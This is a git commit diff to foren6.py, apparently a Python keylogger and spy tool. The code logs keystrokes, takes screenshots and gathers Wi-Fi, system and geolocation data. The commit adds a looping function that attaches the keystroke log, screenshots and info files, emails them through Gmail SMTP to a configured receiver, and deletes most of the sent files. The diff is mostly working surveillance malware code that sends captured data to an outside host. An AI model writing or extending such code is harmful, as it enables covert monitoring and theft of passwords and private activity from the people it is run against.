1b7d27aa69583770e3a9573b0e88425f03da64c5
Blackapple769 <rowejake19@gmail.com>
2021-05-13 16:06:01 -0700

    added emailing(version 1 complete)

--- foren6.py
+++ foren6.py
@@ -1,3 +1,4 @@
+from email.mime.base import MIMEBase
 import time
 import os
 import sys
@@ -12,8 +13,19 @@ import platform
 import subprocess
 import geocoder
 import socket,re,uuid,psutil,logging
-
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+import os
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.application import MIMEApplication
+import glob
 system = platform.system()
+
 
 def log_keystroke(key):
     key = str(key).replace("'", "")
@@ -27,6 +39,8 @@ def log_keystroke(key):
 
     with open("log.txt", 'a') as f:
         f.write(key)
+        
+    f.close()
 
 def take_screenshot(Time):
     while True:
@@ -62,15 +76,7 @@ def get_wifi_info():
         except IndexError:
             wifi_info_list.append("{:<30}|  {:<}".format(i, ""))
 
-    def send_info():
-        email = data["info_email"]
-        email_address = data["sender_email_address"]
-        email_password = data["sender_email_password"]
-
-      
-    
-    
-    
+        
     g = geocoder.ip('me')
     cords = str(f"Location cords: {g.latlng}")
     city = str(f"City: {g.city}")
@@ -81,11 +87,72 @@ def get_wifi_info():
     wifi_info_list.append(city)
     wifi_info_list.append(state)
     
-    wifi_info_file = open("Wifi_info.txt", "w")
+    wifi_info_file = open("wifi_info.txt", "w")
     for info in wifi_info_list:
         wifi_info_file.write(str(info+"\n"))
 
     wifi_info_file.close()
+
+
+
+
+
+
+def send_info1(time_wait, data):
+    time.sleep(time_wait)
+    print("sending email")
+    files1 = []
+    files1.append("System_Info.txt")
+    files1.append("wifi_info.txt")
+    
+    for file in glob.glob("screenshots\\*.png"):
+        files1.append(file)
+        
+
+    msg = MIMEMultipart()
+    msg['To'] = data["info_email_receiver"]
+    msg['From'] = data["sender_email_address"]
+    msg['Subject'] = "FOREN6 INFO"
+    
+    
+    while True:
+        try:
+            e = open("log.txt", "r")
+            e.close
+            files1.append("log.txt")
+            
+        except Exception as e:
+            print(e)
+            pass
+        print(files1)
+        for f in files1:  # add files to the message
+            print(f)
+            attachment = MIMEApplication(open(f, "rb").read())
+            attachment.add_header('Content-Disposition','attachment', filename=f)
+            msg.attach(attachment)
+            if str(f) != "log.txt":
+                os.remove(f)
+            
+        
+        files1 = []
+            
+
+        server = smtplib.SMTP_SSL('smtp.gmail.com')
+        server.login(data["sender_email_address"], data["sender_email_password"])
+        server.sendmail(msg['From'], msg['To'], str(msg))
+        server.quit()
+        print("email sent")
+        time.sleep(time_wait)
+
+
+
+
+
+      
+    
+    
+    
+
 
     
     
@@ -106,7 +173,7 @@ def system_info():
     system_info_list.append(local_ip)
     system_info_list.append(host_name)
     
-    system_info_file = open("System Info.txt", "w")
+    system_info_file = open("System_Info.txt", "w")
     for info in system_info_list:
         system_info_file.write(str(str(info)+"\n"))
 
@@ -120,6 +187,8 @@ if system == "Linux" or system == "Windows":
     screenshot_time = data["screenshot_time"]
     wifi_info = data["get_wifi_info"]
     get_system_info = data["system_info"]
+    send_info_email = data["send_info"]
+    email_send = data["email_send_time"]
     print(screenshot)
     if screenshot:
         screenshot_taking = threading.Thread(target=take_screenshot, args=(screenshot_time,))
@@ -128,6 +197,10 @@ if system == "Linux" or system == "Windows":
     if wifi_info:
         wifi_thread = threading.Thread(target=get_wifi_info)
         wifi_thread.start()
+
+    if send_info_email:
+        email_send_info = threading.Thread(target=send_info1, args=(email_send,data,)) 
+        email_send_info.start()   
 
     if get_system_info:
         sys_thread = threading.Thread(target=system_info) 
